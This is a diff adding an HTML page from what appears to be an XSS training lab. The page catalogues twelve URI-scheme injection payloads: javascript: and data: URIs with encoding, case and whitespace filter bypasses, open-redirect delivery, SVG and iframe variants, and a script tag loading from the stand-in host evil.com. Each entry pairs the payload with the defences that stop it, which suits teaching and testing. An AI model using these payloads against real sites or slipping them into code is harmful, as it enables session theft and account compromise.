@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 03 — URI Scheme Injection</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-mechanism{background:#1e3a5f;color:var(--accent)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-origin{background:#1a1500;color:var(--warn)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>03 — URI Scheme Injection</h1>
+<div class="sub">12 payloads · Mechanism: URI Schemes · Module reference: M06 · Lab endpoint: <code>http://localhost:5000/redirect?url=PAYLOAD</code></div>
+
+<div class="section-label">A. javascript: in Navigable Attributes</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-origin">CLASSIC</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="javascript:alert(document.domain)"&gt;click me&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — href attribute with javascript: pseudo-protocol; requires click</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme: browser navigates to javascript: URI which executes the expression</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters passing anchor tags but not checking href protocol</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers stripping javascript: from href; URL allowlist validation</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The canonical javascript: URI vector. Requires a click. High severity in open redirect bugs where the redirect destination is user-controlled.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — "javascript:" is HTML-entity encoded in decimal</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme; HTML entities decode to "javascript:" before browser evaluates href</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching literal "javascript:" in href before HTML-decoding</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Sanitizers that decode HTML entities before checking href protocol; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Each character is its decimal HTML entity. Browser decodes: <code>&amp;#106;</code>=j, <code>&amp;#97;</code>=a… The browser, not the filter, handles the decoding — so pre-decoding in the filter is mandatory.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="jAvAsCrIpT:alert(1)"&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — javascript: scheme is case-mixed</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme (case-insensitive per RFC 3986)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching only lowercase "javascript:"</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Case-insensitive protocol check; allowlist approach (only allow http/https)</span>
+    <span class="meta-key">Origin</span><span class="meta-val">URI schemes are case-insensitive per the RFC. The browser normalises to lowercase. Allowlist approach (only allow https://) is far safer than blocklist (block javascript:).</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="java&#9;script:alert(1)"&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — tab character (&amp;#9;) inside the scheme name</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme; browsers strip whitespace chars (tab, newline, CR) from href before parsing scheme</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching "javascript:" without stripping whitespace first</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Stripping all whitespace from href before protocol check; allowlist; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Browsers follow RFC 3986 and strip tab/LF/CR from URL values. A tab (ASCII 9) inside "java<TAB>script:" is removed by the browser before scheme comparison. Filter must do the same.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">WHITESPACE</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="  javascript:alert(1)"&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — leading spaces before the scheme name</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme; browsers trim leading whitespace from href values</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">startsWith("javascript:") checks that don't trim first</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped"><code>.trim()</code> before protocol check; allowlist approach</span>
+    <span class="meta-key">Origin</span><span class="meta-val">href values with leading whitespace are trimmed by browsers before navigation. A check for <code>startsWith("javascript:")</code> fails when there's a leading space. Always trim before checking.</span>
+  </div>
+</div>
+
+<div class="section-label">B. data: URI as Inline Document</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — href is a data: URI containing an HTML document with a script</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme: data:text/html loads a new document in same context</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking javascript: but passing data:</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>navigate-to</code> or blocking data: in href; allowlist href to https only; modern browsers restrict data: navigation</span>
+    <span class="meta-key">Origin</span><span class="meta-val">data:text/html loads a full HTML document. In older browsers it ran in the originating origin. Modern Chrome/Firefox treat navigated data: URIs as opaque origin — reduced impact but still a concern in older apps and WebViews.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;click&lt;/a&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — data URI with base64-encoded HTML payload</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme: data:text/html;base64 — browser decodes base64 before parsing</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters scanning data: URI content for script/alert keywords (can't see through base64)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; allowlist href; base64-decoding before content scanning</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The base64 decodes to <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Content-scanning filters must also decode base64 sections. Demonstrates why content-scanning is fundamentally harder than structural approaches.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Open Redirectors as XSS Delivery</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-origin">OPEN REDIRECT</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+http://localhost:5000/redirect?url=javascript:alert(document.domain)</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Open redirect endpoint that passes the url param to Location header or window.location</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme: redirect sets location to javascript: URI which executes in the originating context</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">CSRF defenses (the redirect URL is fully attacker-controlled); filters checking only the original page URL</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Validating the redirect target against an allowlist of safe URLs; rejecting non-http/https schemes in redirect destinations</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Open redirectors are frequently used to make phishing links look legitimate. When the destination is javascript:, they become XSS delivery. Test with the lab's /redirect endpoint.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+http://localhost:5000/redirect?url=%6a%61%76%61%73%63%72%69%70%74%3aalert(1)</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Open redirect — "javascript:" is URL-percent-encoded</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme after URL decoding by the redirect handler</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Redirect handlers that check the raw parameter string before URL-decoding it</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">URL-decoding before checking; allowlist approach</span>
+    <span class="meta-key">Origin</span><span class="meta-val"><code>%6a%61%76%61%73%63%72%69%70%74%3a</code> = "javascript:". Server URL-decodes the parameter and sets Location header. Browser follows the decoded URI. Check after decoding, not before.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Protocol-Relative and Double-Slash Tricks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;script src="//evil.com/xss.js"&gt;&lt;/script&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — protocol-relative URL inherits the page protocol (http or https)</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">1 + 3 — Script tag loading external JS via protocol-relative URL</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that check for "http://" or "https://" as required prefix but pass "//" as seemingly relative</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP script-src restricting to known domains; output encoding; SRI</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Protocol-relative URLs (<code>//host/path</code>) inherit the page's scheme. Used in supply chain injection to load attacker-controlled JS that works on both http and https pages.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg&gt;&lt;use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;foreignObject&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/foreignObject&gt;&lt;/svg&gt;#x"&gt;&lt;/use&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG use element with xlink:href to data: URI containing an SVG with foreignObject</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 + 4 (namespace) — data: URI + SVG namespace + foreignObject allows HTML script execution</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters allowing SVG use element but not inspecting the href value for executable content</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers blocking data: in SVG href; blocking foreignObject in SVG</span>
+    <span class="meta-key">Origin</span><span class="meta-val">SVG foreignObject allows embedding arbitrary HTML inside SVG. Combined with data: URI as the href for use element, this creates a multi-layer execution path. Documented in PortSwigger research.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">URI SCHEME</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;iframe src="javascript:document.write('&lt;script&gt;alert(parent.document.domain)&lt;\/script&gt;')"&gt;&lt;/iframe&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — iframe src with javascript: URI that document.writes a script tag</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme: javascript: src creates a blank document in the iframe; document.write injects script</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters scanning iframe src for "script" keyword (the word appears inside a string literal)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; blocking javascript: in iframe src; output encoding; sandbox attribute on iframe</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The iframe gets a blank about:blank document (inheriting origin). javascript: as iframe src writes into that document. parent.document is accessible same-origin. Classic double-layer technique.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="02_event_handlers.html">← 02: Event Handlers</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="04_svg_mathml.html">04: SVG &amp; MathML →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1500);
+  });
+});
+</script>
+
+</body>
+</html>
